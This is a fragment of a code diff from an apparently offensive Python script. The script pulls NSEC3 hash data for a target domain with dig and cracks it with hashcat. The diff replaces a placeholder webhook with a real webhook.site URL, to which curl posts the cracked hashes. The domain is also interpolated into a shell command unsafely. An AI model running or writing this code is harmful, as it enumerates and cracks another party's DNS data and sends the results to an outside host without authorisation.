@@ -12,4 +12,4 @@ os.system(f"dig {domain} NSEC3PARAM +short > hashes.txt")
 os.system("hashcat -m 150 --force hashes.txt wordlist.txt --potfile-disable")
 
 # Save results
-subprocess.run(["curl", "-X", "POST", "https://your-webhook.com", "--data-binary", "@cracked_hashes.txt"])
+subprocess.run(["curl", "-X", "POST", "https://webhook.site/bdeb4a71-9ee0-4781-86d4-53439a0ec1ae", "--data-binary", "@cracked_hashes.txt"])
